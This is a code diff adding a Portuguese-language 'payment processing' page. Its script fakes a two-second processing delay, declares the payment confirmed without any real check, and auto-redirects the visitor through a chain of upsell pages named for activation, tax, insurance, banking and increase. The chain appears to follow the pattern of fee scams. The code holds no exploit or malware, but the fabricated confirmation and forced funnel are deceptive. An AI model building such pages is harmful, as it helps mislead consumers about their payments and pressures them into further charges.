@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Processando seu pagamento...</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: #EEEEEE;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #333333;
+        }
+
+        .container {
+            background: white;
+            padding: 40px 30px;
+            border-radius: 12px;
+            text-align: center;
+            max-width: 400px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #F0F0F0;
+            border-top: 4px solid #00A650;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .success-icon {
+            font-size: 50px;
+            margin: 0 auto 20px;
+            display: none;
+        }
+
+        .success-icon.show {
+            display: block;
+        }
+
+        .text {
+            font-size: 16px;
+            color: #666;
+            margin-bottom: 10px;
+        }
+
+        .subtext {
+            font-size: 14px;
+            color: #999;
+        }
+
+        .button {
+            background: #3483FA;
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 6px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 20px;
+            display: none;
+        }
+
+        .button.show {
+            display: inline-block;
+        }
+
+        .button:hover {
+            background: #2968C8;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="spinner" id="spinner"></div>
+        <div class="success-icon" id="successIcon">✓</div>
+        <div class="text" id="text">Processando seu pagamento...</div>
+        <div class="subtext" id="subtext">Você será redirecionado em instantes</div>
+        <button class="button" id="continueBtn" onclick="continueToNextUpsell()">Continuar</button>
+    </div>
+
+    <script>
+        // Sequência de upsells
+        const upsellSequence = [
+            'upsell/ativacao/index.html',      // 0
+            'upsell/imposto/index.html',       // 1
+            'upsell/seguro/index.html',        // 2
+            'upsell/banking/index.html',       // 3
+            'upsell/aumento/index.html',       // 4
+            'upsell/aumento/index.html',       // 5
+            '3.html'                            // 6 (finalizar)
+        ];
+
+        // Função para obter parâmetros da URL
+        function getUrlParams() {
+            const params = {};
+            const queryString = window.location.search;
+            const urlParams = new URLSearchParams(queryString);
+
+            for (const [key, value] of urlParams) {
+                params[key] = value;
+            }
+            return params;
+        }
+
+        // Incrementar índice e obter próxima página
+        function getNextUpsell() {
+            let index = sessionStorage.getItem('upsell_index');
+            if (index === null) {
+                index = 0;
+            } else {
+                index = parseInt(index) + 1;
+            }
+            sessionStorage.setItem('upsell_index', index);
+
+            if (index >= upsellSequence.length) {
+                sessionStorage.removeItem('upsell_index');
+                return '3.html';
+            }
+            return upsellSequence[index];
+        }
+
+        // Construir URL com parâmetros preservados
+        function buildUrlWithParams(baseUrl) {
+            const params = getUrlParams();
+            let url = baseUrl;
+            const paramStr = new URLSearchParams(params).toString();
+
+            if (paramStr) {
+                url += '?' + paramStr;
+            }
+
+            return url;
+        }
+
+        // Redirecionar para próximo upsell
+        function continueToNextUpsell() {
+            const nextUpsell = getNextUpsell();
+            const finalUrl = buildUrlWithParams(nextUpsell);
+            console.log('Redirecionando para:', finalUrl);
+            window.location.href = finalUrl;
+        }
+
+        // Na inicialização da página
+        window.addEventListener('DOMContentLoaded', () => {
+            // Simular processamento por 2 segundos
+            setTimeout(() => {
+                // Mostrar sucesso
+                document.getElementById('spinner').style.display = 'none';
+                document.getElementById('successIcon').classList.add('show');
+                document.getElementById('text').textContent = 'Pagamento confirmado com sucesso!';
+                document.getElementById('subtext').textContent = 'Você será redirecionado para a próxima oferta';
+                document.getElementById('continueBtn').classList.add('show');
+
+                // Auto-redirecionar após 3 segundos
+                setTimeout(continueToNextUpsell, 3000);
+            }, 2000);
+        });
+    </script>
+</body>
+</html>
